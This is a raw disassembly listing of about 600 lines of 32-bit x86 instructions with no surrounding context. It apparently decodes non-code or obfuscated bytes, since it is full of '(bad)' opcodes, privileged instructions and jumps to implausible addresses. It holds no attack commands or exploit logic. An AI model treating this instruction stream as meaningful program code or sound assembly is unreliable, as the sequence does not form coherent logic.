  41efe0:	enter  0xa9d9,0xfd
  41efe4:	jmp    0xf26b12e4
  41efe9:	sub    ebp,DWORD PTR [edx+0x6e]
  41efec:	sbb    esp,ebp
  41efee:	ss ja  0x41efd5
  41eff1:	push   0x8dda4c0
  41eff6:	xlat   BYTE PTR ds:[ebx]
  41eff7:	push   ecx
  41eff8:	adc    cl,BYTE PTR [ecx+0x78]
  41effb:	aad    0xf1
  41effd:	loop   0x41efed
  41efff:	shl    BYTE PTR fs:[edx],cl
  41f002:	mov    bl,0x9f
  41f004:	add    DWORD PTR [eax+0xb21f1dd],eax
  41f00a:	ss dec ebp
  41f00c:	inc    ebp
  41f00d:	mov    eax,0x4b8f7c65
  41f012:	popf   
  41f013:	cmp    edi,ebp
  41f015:	pop    edx
  41f016:	push   edi
  41f017:	mov    ds:0xa131490a,eax
  41f01c:	jns    0x41efc7
  41f01e:	jmp    0x41f056
  41f020:	retf   
  41f021:	push   ebx
  41f022:	(bad)  
  41f023:	imul   ecx,DWORD PTR [esi+0x3be10806],0x5e
  41f02a:	lods   eax,DWORD PTR ds:[esi]
  41f02b:	push   esp
  41f02c:	std    
  41f02d:	add    dl,0x2e
  41f030:	cmc    
  41f031:	and    DWORD PTR [ecx],0x362deaad
  41f037:	iret   
  41f038:	jl     0x41efd1
  41f03a:	sbb    al,BYTE PTR [ecx]
  41f03c:	mov    ecx,DWORD PTR [bx+di]
  41f03f:	push   es
  41f040:	ret    
  41f041:	or     bh,BYTE PTR [edx+0x78]
  41f044:	(bad)  
  41f045:	repnz fst st(2)
  41f048:	push   ebx
  41f049:	xchg   esi,eax
  41f04a:	xor    bl,BYTE PTR [ebx+0x51]
  41f04d:	popa   
  41f04e:	mov    cs,WORD PTR [eax-0x2ccb1144]
  41f054:	jmp    0x41f072
  41f056:	push   esp
  41f057:	inc    ebx
  41f058:	pop    esp
  41f059:	mov    ebx,0x31c88546
  41f05e:	imul   ebx,DWORD PTR [ebx],0xffffff9c
  41f061:	xchg   esp,eax
  41f062:	and    edi,ecx
  41f064:	test   edi,0xdf202336
  41f06a:	dec    edx
  41f06b:	daa    
  41f06c:	push   esi
  41f06d:	sub    DWORD PTR [ecx+eiz*4],esp
  41f070:	jp     0x41f09b
  41f072:	cld    
  41f073:	adc    ebx,0xfffffffc
  41f076:	and    bh,dl
  41f078:	xchg   esi,eax
  41f079:	mov    gs,WORD PTR [edx-0x30]
  41f07c:	fcomp  QWORD PTR [ecx-0x29]
  41f07f:	pop    esi
  41f080:	dec    ecx
  41f081:	push   ebx
  41f082:	adc    eax,0xd5d58639
  41f087:	in     al,dx
  41f088:	aaa    
  41f089:	or     DWORD PTR [ebp-0x26e1c564],esp
  41f08f:	retf   
  41f090:	mov    al,ds:0x6b13566
  41f095:	outs   dx,DWORD PTR ds:[esi]
  41f096:	mov    ch,0x21
  41f098:	pop    es
  41f099:	pop    ss
  41f09a:	cmc    
  41f09b:	popf   
  41f09c:	mov    BYTE PTR [edi],cl
  41f09e:	pop    ebp
  41f09f:	push   ecx
  41f0a0:	jge    0x41f0ac
  41f0a2:	add    ebx,ebx
  41f0a4:	in     eax,dx
  41f0a5:	cs ds mov edi,0x787e1a6c
  41f0ac:	dec    DWORD PTR [ebp+eax*2-0x2736eade]
  41f0b3:	leave  
  41f0b4:	sub    BYTE PTR [ebx],dl
  41f0b6:	dec    ebp
  41f0b7:	xor    edi,DWORD PTR [esp+ecx*1-0x61]
  41f0bb:	push   esi
  41f0bc:	lea    ebp,[esi]
  41f0be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0bf:	mov    edx,0x8b7a543b
  41f0c4:	out    dx,eax
  41f0c5:	dec    esp
  41f0c6:	iret   
  41f0c7:	int    0xd0
  41f0c9:	mov    al,0xdf
  41f0cb:	leave  
  41f0cc:	int3   
  41f0cd:	pop    ebp
  41f0ce:	pop    eax
  41f0cf:	les    ecx,FWORD PTR [edx]
  41f0d1:	loopne 0x41f107
  41f0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0d4:	cmp    esp,ebp
  41f0d6:	std    
  41f0d7:	jmp    0x6652:0x7722a4d4
  41f0de:	scas   al,BYTE PTR es:[edi]
  41f0df:	test   DWORD PTR [ebx+0x5c],0xdd3f7bad
  41f0e6:	pop    ebx
  41f0e8:	int    0x5e
  41f0ea:	sbb    bl,bh
  41f0ec:	jb     0x41f151
  41f0ee:	(bad)  
  41f0ef:	mov    esp,DWORD PTR [esi]
  41f0f1:	cwde   
  41f0f2:	jne    0x41f0e5
  41f0f4:	sub    BYTE PTR [ecx],cl
  41f0f6:	ins    DWORD PTR es:[edi],dx
  41f0f7:	mov    bh,0x4
  41f0f9:	gs mov ecx,0x517d909d
  41f0ff:	(bad)  
  41f100:	icebp  
  41f101:	inc    ebx
  41f102:	hlt    
  41f103:	retf   
  41f104:	add    esp,DWORD PTR [ecx+eax*1-0x6a]
  41f108:	mov    al,0xce
  41f10a:	cmp    DWORD PTR [esi+0x79d07c9b],ebp
  41f110:	jnp    0x41f0bf
  41f112:	cmp    BYTE PTR [eax],ch
  41f114:	push   ecx
  41f115:	dec    edx
  41f116:	adc    eax,0xdda61181
  41f11b:	jp     0x41f0c0
  41f11d:	mov    esi,ebx
  41f11f:	aad    0xc4
  41f121:	imul   BYTE PTR [ecx-0x4fb86831]
  41f127:	mov    edx,0x45c6eecb
  41f12c:	aad    0xc4
  41f12e:	and    al,0xef
  41f130:	jnp    0x41f0bf
  41f132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f133:	fwait
  41f134:	add    DWORD PTR [ebp+0x7cf6227d],ebp
  41f13a:	jae    0x41f12c
  41f13c:	pop    es
  41f13d:	xor    edi,DWORD PTR [esi-0x54]
  41f140:	jb     0x41f1b2
  41f142:	jecxz  0x41f1b7
  41f144:	sbb    DWORD PTR [ebx],esp
  41f146:	nop
  41f147:	out    0x43,al
  41f149:	dec    ecx
  41f14a:	xchg   BYTE PTR [edi],dh
  41f14c:	pop    ds
  41f14d:	in     eax,dx
  41f14e:	(bad)  
  41f14f:	stc    
  41f150:	mov    cl,0xfc
  41f152:	xchg   esp,eax
  41f153:	rol    dl,0xc5
  41f156:	jp     0x41f116
  41f158:	rcr    dl,1
  41f15a:	sub    dh,cl
  41f15c:	jmp    0x41f135
  41f15e:	inc    ebp
  41f15f:	retf   0xfe7a
  41f162:	pop    es
  41f163:	lea    ebp,[edi-0x75]
  41f166:	jne    0x41f17a
  41f168:	xor    bl,BYTE PTR [eax]
  41f16a:	xor    BYTE PTR [eax],dh
  41f16c:	inc    esp
  41f16d:	out    dx,eax
  41f16e:	or     al,0xab
  41f170:	test   DWORD PTR [ebx-0x38],eax
  41f173:	out    0xe1,al
  41f175:	and    bl,BYTE PTR [esi+eax*8+0x64]
  41f179:	(bad)  
  41f17a:	mov    ds:0x22db1388,eax
  41f17f:	cwde   
  41f180:	jge    0x41f1fa
  41f182:	dec    ecx
  41f183:	out    0xd,eax
  41f185:	sti    
  41f186:	mov    cl,0xac
  41f188:	adc    bh,BYTE PTR [eax-0x26405fa1]
  41f18e:	ins    BYTE PTR es:[edi],dx
  41f18f:	mov    dh,0x49
  41f191:	mov    esi,0x5efb4bbe
  41f196:	sub    edi,esp
  41f198:	mov    esi,0x440213ad
  41f19d:	xchg   ebp,eax
  41f19e:	shr    DWORD PTR [ecx-0x1],1
  41f1a1:	(bad)  
  41f1a2:	mov    eax,ds:0xb0f9a968
  41f1a7:	clc    
  41f1a8:	rol    BYTE PTR [ecx+0x79c0895c],1
  41f1ae:	cmp    BYTE PTR [edi+eax*2],bh
  41f1b1:	imul   eax,DWORD PTR [ecx-0x50],0xe
  41f1b5:	les    ebx,FWORD PTR [edx+0x20638d21]
  41f1bb:	aad    0x7c
  41f1bd:	nop    DWORD PTR [ebp+0x33be171c]
  41f1c4:	jmp    0x7b8b13a2
  41f1c9:	outs   dx,BYTE PTR fs:[esi]
  41f1cb:	icebp  
  41f1cc:	scas   al,BYTE PTR es:[edi]
  41f1cd:	sub    bl,BYTE PTR [edx]
  41f1cf:	push   ss
  41f1d0:	(bad)  
  41f1d2:	cpuid  
  41f1d4:	loopne 0x41f16e
  41f1d6:	xor    al,BYTE PTR [esi-0x4e29944a]
  41f1dc:	ins    DWORD PTR es:[edi],dx
  41f1dd:	push   esp
  41f1de:	mov    eax,0x79abc751
  41f1e3:	(bad)  
  41f1e4:	pop    esp
  41f1e5:	in     eax,0xd7
  41f1e7:	inc    edi
  41f1e8:	shl    BYTE PTR [eax-0xccf1c5e],0x4e
  41f1ef:	xchg   edi,eax
  41f1f0:	icebp  
  41f1f1:	xchg   ecx,eax
  41f1f2:	xchg   ebp,eax
  41f1f3:	popf   
  41f1f4:	popa   
  41f1f5:	pop    ecx
  41f1f6:	fsub   DWORD PTR [ecx-0x45]
  41f1f9:	sub    cl,BYTE PTR [edx+0x13]
  41f1fc:	xor    al,0x4
  41f1fe:	out    dx,al
  41f1ff:	push   cs
  41f200:	add    BYTE PTR [ecx-0x21755bcf],dh
  41f206:	push   esi
  41f207:	pop    edx
  41f208:	and    al,0x97
  41f20a:	out    0xf4,eax
  41f20c:	cs cmp eax,0x4379f56c
  41f212:	mov    cs,WORD PTR [edi+0x3c5b76cb]
  41f218:	loope  0x41f1b5
  41f21a:	push   ss
  41f21b:	add    eax,0x76d1b4ff
  41f220:	scas   eax,DWORD PTR es:[edi]
  41f221:	inc    ebp
  41f222:	push   edi
  41f223:	out    0xcd,eax
  41f225:	pusha  
  41f226:	lods   al,BYTE PTR ds:[esi]
  41f227:	aam    0x94
  41f229:	aad    0xd8
  41f22b:	adc    DWORD PTR [ebx-0x15],esi
  41f22e:	(bad)  
  41f22f:	mov    ds:0x2f3dbbd5,eax
  41f234:	mov    esp,0x3065f9e3
  41f239:	scas   eax,DWORD PTR es:[edi]
  41f23a:	mov    gs,WORD PTR [edi-0x45b69478]
  41f240:	(bad)  
  41f241:	xor    ecx,DWORD PTR [esi+0x72]
  41f244:	push   esi
  41f245:	xchg   esi,eax
  41f246:	shl    ah,0x2e
  41f249:	(bad)  
  41f24b:	dec    ecx
  41f24c:	push   0xffffff94
  41f24e:	hlt    
  41f24f:	inc    edx
  41f250:	push   ebx
  41f251:	xor    esp,DWORD PTR [esi-0x27264a46]
  41f257:	add    DWORD PTR [ebp+0x54b03995],0x3aa8179f
  41f261:	add    al,BYTE PTR [ecx+0x6d]
  41f264:	retf   
  41f265:	mov    ds:0x9da9cb41,eax
  41f26a:	jae    0x41f29f
  41f26c:	xchg   bl,al
  41f26e:	xchg   ebx,eax
  41f26f:	pop    esp
  41f270:	pop    edx
  41f271:	xchg   esp,eax
  41f272:	add    BYTE PTR [edi+0x6475201d],dl
  41f278:	mov    ds:0x5f50f7bf,al
  41f27d:	inc    ebx
  41f27e:	mov    esp,0xf2853ff5
  41f283:	iret   
  41f284:	xchg   esi,eax
  41f285:	adc    bh,cl
  41f287:	cld    
  41f288:	imul   ebp,DWORD PTR [ebx+edi*1+0x20],0xffffffca
  41f28d:	shl    ecx,1
  41f28f:	cmp    ebp,edi
  41f291:	loopne 0x41f287
  41f293:	aaa    
  41f294:	das    
  41f295:	rcr    BYTE PTR ds:0xe84efb6,cl
  41f29b:	mov    esp,0xaa3d9748
  41f2a0:	scas   al,BYTE PTR es:[edi]
  41f2a1:	and    edi,esi
  41f2a3:	and    ecx,DWORD PTR [ecx+0x470e7e3]
  41f2a9:	push   ss
  41f2aa:	mov    ecx,0x7dab54b2
  41f2af:	gs mov eax,0xe1af38ea
  41f2b5:	adc    dh,dh
  41f2b7:	mov    dl,0xc4
  41f2b9:	nop
  41f2ba:	inc    esp
  41f2bb:	cld    
  41f2bc:	fcomp  DWORD PTR [ebx+0x2ba0f023]
  41f2c2:	ret    
  41f2c3:	int3   
  41f2c4:	leave  
  41f2c5:	inc    eax
  41f2c6:	mov    ebx,0xf5da50d1
  41f2cb:	xchg   ecx,eax
  41f2cc:	leave  
  41f2cd:	and    eax,0xea08fe94
  41f2d2:	test   eax,0x6b334288
  41f2d7:	pop    eax
  41f2d8:	adc    esi,DWORD PTR [ebx-0x12]
  41f2db:	cmp    al,0xe2
  41f2dd:	mov    edi,ebp
  41f2df:	nop
  41f2e0:	js     0x41f29b
  41f2e2:	daa    
  41f2e3:	add    DWORD PTR [ecx+0x7],0xb8f37124
  41f2ea:	pop    es
  41f2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2ed:	dec    esp
  41f2ee:	lahf   
  41f2ef:	xor    al,0xd
  41f2f1:	mov    dl,0xa1
  41f2f3:	adc    al,0xf7
  41f2f5:	pop    eax
  41f2f6:	mov    ?,WORD PTR [ecx+0x44]
  41f2f9:	shl    BYTE PTR [ebp-0x14e07458],cl
  41f2ff:	jb     0x41f2fd
  41f301:	retf   0x6fcf
  41f304:	jl     0x41f355
  41f306:	pop    eax
  41f307:	ins    DWORD PTR es:[edi],dx
  41f308:	push   ss
  41f309:	sub    bh,dl
  41f30b:	ficomp WORD PTR [eax]
  41f30d:	mov    edx,0x481484a5
  41f312:	dec    edi
  41f313:	(bad)  
  41f314:	mov    ds:0xba3c5853,al
  41f319:	loope  0x41f362
  41f31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f31c:	in     eax,dx
  41f31d:	iret   
  41f31e:	inc    eax
  41f31f:	mov    bh,0x44
  41f321:	out    dx,al
  41f322:	jno    0x41f2d8
  41f324:	sbb    DWORD PTR [edi-0x65b49e61],0xffffff97
  41f32b:	cdq    
  41f32c:	imul   ebx,DWORD PTR [eax+0x37],0x4aa7ad96
  41f333:	xor    al,0x9d
  41f335:	and    BYTE PTR ds:0x29d1e45c,ah
  41f33b:	cmp    BYTE PTR [edi+ebp*8-0x453079e8],0x76
  41f343:	push   es
  41f344:	fmul   DWORD PTR [ebx+0x36a0b7b1]
  41f34a:	cld    
  41f34b:	inc    esi
  41f34c:	sbb    al,0xf8
  41f34e:	sbb    BYTE PTR ds:0x8ecfebc4,0xc0
  41f356:	stc    
  41f357:	push   ds
  41f358:	sub    ah,BYTE PTR [esi+0x5d3697bb]
  41f35e:	(bad)  
  41f35f:	mov    eax,ds:0x4ab2951a
  41f364:	sub    ebp,DWORD PTR [edi+ebp*2+0x50]
  41f368:	add    DWORD PTR [edx-0x5d7a2185],edx
  41f36e:	sub    BYTE PTR [esi-0x7edee2dd],bl
  41f374:	rol    BYTE PTR [edi],0x6
  41f377:	test   BYTE PTR ds:0x8a8e719b,ah
  41f37d:	jo     0x41f3e3
  41f37f:	push   edx
  41f380:	fdivrp st(1),st
  41f382:	shl    DWORD PTR [ebx],0x61
  41f385:	out    dx,eax
  41f386:	jo     0x41f364
  41f388:	scas   al,BYTE PTR es:[edi]
  41f389:	mov    ah,0xbf
  41f38b:	sub    BYTE PTR [esi-0x774a23df],dh
  41f391:	ja     0x41f32f
  41f393:	jnp    0x41f3ac
  41f395:	call   0xa72175ad
  41f39a:	sbb    ebp,DWORD PTR [esi-0x68ee79a9]
  41f3a0:	and    DWORD PTR ds:[ebp-0x4c],edx
  41f3a4:	inc    eax
  41f3a5:	dec    esi
  41f3a6:	ret    0xd892
  41f3a9:	xor    BYTE PTR [ecx-0x42fad877],ch
  41f3af:	inc    eax
  41f3b0:	or     BYTE PTR [ebp-0x52eb7061],ah
  41f3b6:	loop   0x41f418
  41f3b8:	cmp    DWORD PTR [ebp-0x69],esp
  41f3bb:	loopne 0x41f405
  41f3bd:	push   esp
  41f3be:	and    eax,0xad849bd3
  41f3c3:	cli    
  41f3c4:	pop    es
  41f3c5:	stos   DWORD PTR es:[edi],eax
  41f3c6:	jl     0x41f36d
  41f3c8:	rcr    BYTE PTR [ecx+0x4a1de7c2],0xd0
  41f3cf:	mov    edi,0x27aa0e71
  41f3d4:	stc    
  41f3d5:	rcr    ebx,0xcc
  41f3d8:	jmp    0x41f412
  41f3da:	mov    esi,0x85c7da43
  41f3df:	xchg   ecx,eax
  41f3e0:	dec    esp
  41f3e1:	xor    esi,edi
  41f3e3:	aas    
  41f3e4:	add    edi,DWORD PTR [ebx]
  41f3e6:	fwait
  41f3e7:	int    0xdc
  41f3e9:	lock lahf 
  41f3eb:	call   0x3f74eaa3
  41f3f0:	int    0x44
  41f3f2:	mov    ch,BYTE PTR [ecx]
  41f3f4:	and    eax,0x2c36e19a
  41f3f9:	mov    bh,0x85
  41f3fb:	fwait
  41f3fc:	dec    ebp
  41f3fd:	es loope 0x41f437
  41f400:	fistp  WORD PTR [ecx+ebx*8]
  41f403:	or     BYTE PTR ds:0x651a3239,cl
  41f409:	inc    esp
  41f40a:	fbstp  TBYTE PTR [esi]
  41f40c:	jmp    0x41cf:0x5458bec8
  41f413:	std    
  41f414:	pavgb  mm4,QWORD PTR ds:0xc8d4ae1c
  41f41b:	(bad)  
  41f41c:	aam    0xed
  41f41e:	add    eax,0x88365568
  41f423:	das    
  41f424:	jo     0x41f3cc
  41f426:	imul   esi,DWORD PTR [esi+0xeecbeed],0xf8ebe90c
  41f430:	jge    0x41f3ed
  41f432:	xlat   BYTE PTR ds:[ebx]
  41f433:	and    bh,dl
  41f435:	xor    eax,0x854677d7
  41f43a:	inc    ebx
  41f43b:	lods   al,BYTE PTR ds:[esi]
  41f43c:	cmp    eax,DWORD PTR [ecx]
  41f43e:	jl     0x41f4a7
  41f440:	pop    edi
  41f441:	jl     0x41f42c
  41f443:	adc    ebx,0x5a
  41f446:	outs   dx,BYTE PTR ds:[esi]
  41f447:	fcomip st,st(0)
  41f449:	xor    esi,ebp
  41f44b:	mov    WORD PTR [esi-0xbfbffdb],fs
  41f451:	(bad)  
  41f452:	adc    bh,bh
  41f454:	rcr    eax,cl
  41f456:	hlt    
  41f457:	push   ecx
  41f458:	dec    esp
  41f459:	mov    eax,ds:0x6cbcff55
  41f45e:	sub    bh,BYTE PTR [edx+ebp*1+0x31f3e042]
  41f465:	and    bh,bh
  41f467:	sbb    al,0xd1
  41f469:	fisubr DWORD PTR [ebx+ebx*8]
  41f46c:	dec    eax
  41f46d:	xchg   edi,eax
  41f46e:	adc    al,0xca
  41f470:	repnz inc edi
  41f472:	iret   
  41f473:	ret    
  41f474:	jp     0x41f46f
  41f476:	into   
  41f477:	jmp    0x53a4b9d2
  41f47c:	or     esi,DWORD PTR [ecx-0x4f]
  41f47f:	(bad)  
  41f480:	lahf   
  41f481:	or     ebp,edi
  41f483:	lock cmp ecx,DWORD PTR [edx-0x7c]
  41f487:	cmpps  xmm6,XMMWORD PTR [edi-0x492bfd51],0x25
  41f48f:	inc    esi
  41f490:	out    0x53,al
  41f492:	xor    bl,bh
  41f494:	jle    0x41f45c
  41f496:	inc    edi
  41f497:	or     al,0xfc
  41f499:	add    ecx,DWORD PTR [esp+edi*4]
  41f49c:	inc    esp
  41f49d:	(bad)  
  41f49e:	stos   BYTE PTR es:[edi],al
  41f49f:	and    DWORD PTR [esi],esi
  41f4a1:	js     0x41f47b
  41f4a3:	push   edi
  41f4a4:	add    eax,0xe282d374
  41f4a9:	pop    edi
  41f4aa:	das    
  41f4ab:	dec    esp
  41f4ac:	repnz sub DWORD PTR [ebx+0x37],eax
  41f4b0:	fnstsw WORD PTR [esi+0x7e]
  41f4b3:	ret    0x4e02
  41f4b6:	xchg   ecx,eax
  41f4b7:	adc    eax,0x99acef34
  41f4bc:	int    0x89
  41f4be:	sub    DWORD PTR [ecx-0x36],0x76be7981
  41f4c5:	inc    ebx
  41f4c6:	dec    esp
  41f4c7:	or     ecx,DWORD PTR [edi]
  41f4c9:	lods   al,BYTE PTR ds:[esi]
  41f4ca:	add    BYTE PTR [edi],bl
  41f4cc:	call   FWORD PTR [ebp+0x49]
  41f4cf:	jp     0x41f524
  41f4d1:	xchg   DWORD PTR [eax],ebp
  41f4d3:	ins    DWORD PTR es:[edi],dx
  41f4d4:	popf   
  41f4d5:	and    eax,DWORD PTR [ebp-0x5a]
  41f4d8:	inc    eax
  41f4d9:	imul   edx,DWORD PTR [eax-0x1d6578c3],0xdfae51c0
  41f4e3:	sub    al,0x8a
  41f4e5:	fwait
  41f4e6:	jb     0x41f501
  41f4e8:	pop    ecx
  41f4e9:	sub    al,BYTE PTR [edi-0x7e]
  41f4ec:	outs   dx,BYTE PTR ds:[esi]
  41f4ed:	inc    ebp
  41f4ee:	cwde   
  41f4ef:	jnp    0x41f4b9
  41f4f1:	dec    esi
  41f4f2:	xchg   edi,eax
  41f4f3:	dec    ecx
  41f4f4:	xor    al,0x70
  41f4f6:	jp     0x41f4e0
  41f4f8:	in     eax,dx
  41f4f9:	push   ebx
  41f4fa:	add    al,0xda
  41f4fc:	push   0x4c
  41f4fe:	pushf  
  41f4ff:	stc    
  41f500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f501:	std    
  41f502:	clc    
  41f503:	aam    0x83
  41f505:	fnstcw WORD PTR [ecx+0x6196daa1]
  41f50b:	jecxz  0x41f4c0
  41f50d:	pop    ebp
  41f50e:	xchg   BYTE PTR [eax+edi*8],dh
  41f511:	fwait
  41f512:	sub    dl,BYTE PTR [esi-0x96589f5]
  41f518:	sub    ebx,0x78322164
  41f51e:	adc    al,0xe1
  41f520:	xchg   DWORD PTR [esi-0x4f],edx
  41f523:	lds    edi,FWORD PTR [ecx+0x26ab1b64]
  41f529:	mov    cl,0x28
  41f52b:	mov    bh,BYTE PTR ds:0xe897530a
  41f531:	iret   
  41f532:	cmp    ecx,DWORD PTR [edi]
  41f534:	test   BYTE PTR [ecx+0x5f],ch
  41f537:	sbb    dh,cl
  41f539:	(bad)  
  41f53a:	std    
  41f53b:	push   cs
  41f53c:	sbb    BYTE PTR [ecx+0x1c],cl
  41f53f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f540:	jg     0x41f5ab
  41f542:	sbb    dl,BYTE PTR es:[edx-0x2607085c]
  41f549:	pop    edi
  41f54a:	adc    bl,BYTE PTR [esi]
  41f54c:	loope  0x41f5c3
  41f54e:	xor    al,0x92
  41f550:	fnstenv [eax+0x221bd3b7]
  41f556:	dec    ecx
  41f557:	jne    0x41f537
  41f559:	scas   eax,DWORD PTR es:[edi]
  41f55a:	mov    ch,0x51
  41f55d:	mov    edi,0x455a911c
  41f562:	sub    ch,ah
  41f564:	dec    eax
  41f565:	cmp    BYTE PTR [edi-0x5a],bh
  41f568:	push   eax
  41f569:	jo     0x41f5a1
  41f56b:	add    dl,BYTE PTR [edx]
  41f56d:	pushf  
  41f56e:	jge    0x41f5a4
  41f570:	leave  
  41f571:	(bad)  
  41f572:	push   ds
  41f573:	xchg   esp,eax
  41f574:	outs   dx,DWORD PTR ds:[esi]
  41f575:	xor    al,0x76
  41f577:	lods   al,BYTE PTR ds:[esi]
  41f578:	and    ebp,DWORD PTR [esi]
  41f57a:	jle    0x41f59f
  41f57c:	sub    BYTE PTR [ecx-0x62],ch
  41f57f:	cwde   
  41f580:	mov    ah,BYTE PTR [esi]
  41f582:	nop
  41f583:	scas   eax,DWORD PTR es:[edi]
  41f584:	push   es
  41f585:	inc    edi
  41f586:	imul   esi,DWORD PTR [ebp-0x4d],0x5c
  41f58a:	test   dl,al
  41f58c:	test   DWORD PTR [eax-0x3f7822a2],edx
  41f592:	sbb    al,0x34
  41f594:	icebp  
  41f595:	xchg   edi,eax
  41f596:	sbb    DWORD PTR [edi],edi
  41f598:	test   dl,ah
  41f59a:	adc    esp,DWORD PTR [eax]
  41f59c:	sub    al,BYTE PTR [esi]
  41f59e:	jns    0x41f528
  41f5a0:	pop    ebx
  41f5a1:	sub    DWORD PTR [edx-0x6206f636],ebx
  41f5a7:	sbb    al,0x0
  41f5a9:	push   cs
  41f5aa:	xchg   edi,eax
  41f5ab:	shr    DWORD PTR [ecx+esi*8+0x6f9c5ae4],cl
  41f5b2:	and    eax,0xee722e95
  41f5b7:	pop    ds
  41f5b8:	mov    ebx,0xe9308437
  41f5bd:	test   al,0x7d
  41f5bf:	jns    0x41f5db
  41f5c1:	and    eax,0x78591822
  41f5c6:	fisub  WORD PTR [ebp+0x61]
  41f5c9:	xchg   BYTE PTR [esi+0x32],dl
  41f5cc:	fmul   st,st(4)
  41f5ce:	xor    eax,DWORD PTR [edx]
  41f5d0:	push   0x3a
  41f5d2:	pop    eax
  41f5d3:	es retf 0x5c50
  41f5d7:	stos   DWORD PTR es:[edi],eax
  41f5d8:	loop   0x41f5d8
  41f5da:	push   ss
  41f5db:	ror    eax,cl
  41f5dd:	addr16 sbb al,0x2f
  41f5e0:	push   0x190569bf
  41f5e5:	cmp    al,0x54
  41f5e7:	inc    ebp
  41f5e8:	test   al,0x9
  41f5ea:	fdiv   QWORD PTR [ecx*2+0x24fa7b09]
  41f5f1:	outs   dx,DWORD PTR ds:[esi]
  41f5f2:	mov    bl,0x6b
  41f5f4:	mov    dh,0xf7
  41f5f6:	ror    BYTE PTR [ebp+0x1421310f],cl
  41f5fc:	daa    
  41f5fd:	pop    edi
  41f5fe:	pop    eax
  41f5ff:	loopne 0x41f671
  41f601:	test   al,0xca
  41f603:	push   0xe2f9908f
  41f608:	stos   BYTE PTR es:[edi],al
  41f609:	stc    
  41f60a:	in     al,dx
  41f60b:	ret    0x2fe2
  41f60e:	add    esp,edi
  41f610:	sahf   
  41f611:	add    eax,0xd2721a56
  41f616:	idiv   DWORD PTR [esi-0x63]
  41f619:	mov    esp,0xaf06034f
  41f61e:	sbb    BYTE PTR [ebp-0x7b],bh
  41f621:	mov    ebx,0x98bf22d3
  41f626:	loopne 0x41f5b9
  41f628:	in     al,0x3
  41f62a:	xchg   ecx,eax
  41f62b:	cdq    
  41f62c:	sbb    DWORD PTR ds:0x1597781e,ecx
  41f632:	add    al,0xd4
  41f634:	xor    eax,0x64545f45
  41f639:	mov    dh,0xaf
  41f63b:	xchg   ebp,eax
  41f63c:	xor    DWORD PTR [ebx+0x5637d771],edi
  41f642:	or     esp,edx
  41f644:	outs   dx,BYTE PTR ds:[esi]
  41f645:	imul   esi,DWORD PTR [esi],0x31
  41f648:	scas   eax,DWORD PTR es:[edi]
  41f649:	or     BYTE PTR [ebx],ch
  41f64b:	pusha  
  41f64c:	or     BYTE PTR [ecx-0x7c],dh
  41f64f:	jmp    0x41f636
  41f651:	test   eax,0xa623c4f7
  41f656:	in     al,0xfd
  41f658:	sbb    BYTE PTR [edi],dh
  41f65a:	int    0x2e
  41f65c:	pop    ds
  41f65d:	(bad)  
  41f65e:	fidiv  DWORD PTR [ebx-0x499ea448]
  41f664:	sbb    bh,bh
  41f666:	fdivr  DWORD PTR [ecx-0x60bcdf22]
  41f66c:	loope  0x41f608
  41f66e:	push   0xd2773005
  41f673:	nop
  41f674:	(bad)  
  41f675:	int    0xfe
  41f677:	push   ebp
  41f678:	jle    0x41f61c
  41f67a:	outs   dx,BYTE PTR ds:[esi]
  41f67b:	ror    BYTE PTR [eax-0xd],1
  41f67e:	jo     0x41f6b7
  41f680:	scas   eax,DWORD PTR es:[edi]
  41f681:	(bad)  
  41f682:	adc    DWORD PTR [ebp+0x2fcd783d],esp
  41f688:	add    BYTE PTR [eax+0x1d],dh
  41f68b:	ror    DWORD PTR [ecx-0x77],cl
  41f68e:	adc    eax,0xb46c8373
  41f693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f694:	xchg   bl,al
  41f696:	mov    ch,0xdd
  41f698:	dec    esp
  41f699:	(bad)
  41f69c:	xor    ebx,DWORD PTR [edi+0x13]
  41f69f:	jp     0x41f69a
  41f6a1:	test   bl,ah
  41f6a3:	lds    edi,FWORD PTR [eax-0x6248a94d]
  41f6a9:	aas    
  41f6aa:	jmp    0x35c5396b
  41f6af:	or     al,0xbf
  41f6b1:	cmp    eax,0x2a5dd9b1
  41f6b6:	arpl   WORD PTR [edx+0x6b],bp
  41f6b9:	adc    esp,DWORD PTR [ebx+0x6a0fd0df]
  41f6bf:	dec    ebx
  41f6c0:	lock push esi
  41f6c2:	into   
  41f6c3:	jg     0x41f678
  41f6c5:	jg     0x41f6e4
  41f6c7:	and    eax,0x237168ea
  41f6cc:	sysexit 
  41f6ce:	add    eax,0x9ce9fab2
  41f6d3:	push   esp
  41f6d4:	repz cli 
  41f6d6:	and    DWORD PTR [edx],ecx
  41f6d8:	(bad)  
  41f6d9:	stc    
  41f6da:	shr    DWORD PTR [esi],0x49
  41f6dd:	(bad)  
  41f6de:	imul   esi,esp,0x0
  41f6e1:	aas    
  41f6e2:	jo     0x41f717
  41f6e4:	aaa    
  41f6e5:	xchg   sp,ax
  41f6e7:	aaa    
  41f6e8:	mov    ds:0x36aadf5c,al
  41f6ed:	sub    cl,BYTE PTR [eax+0x15]
  41f6f0:	retf   0x8327
  41f6f3:	mov    ch,0xc3
  41f6f5:	sbb    ecx,eax
  41f6f7:	jp     0x41f775
  41f6f9:	mov    eax,0xea4506bd
  41f6fe:	or     BYTE PTR [edi-0x7ff8a938],0x4
  41f705:	inc    ebp
  41f706:	xor    eax,DWORD PTR [edx-0xe]
  41f709:	loope  0x41f69a
  41f70b:	push   ebx
  41f70c:	shr    DWORD PTR gs:[esi+0x51],cl
  41f710:	stc    
  41f711:	and    DWORD PTR [edi-0x2bb80cb9],ebp
  41f717:	pop    edi
  41f718:	push   esi
  41f719:	jbe    0x41f6eb
  41f71b:	add    dh,BYTE PTR [ecx]
  41f71d:	xchg   edi,eax
  41f71e:	and    BYTE PTR [ebx-0x4a],al
  41f721:	dec    esp
  41f722:	loopne 0x41f753
  41f724:	mov    cl,0x47
  41f726:	gs mov bh,ah
  41f729:	xchg   ebp,eax
  41f72a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
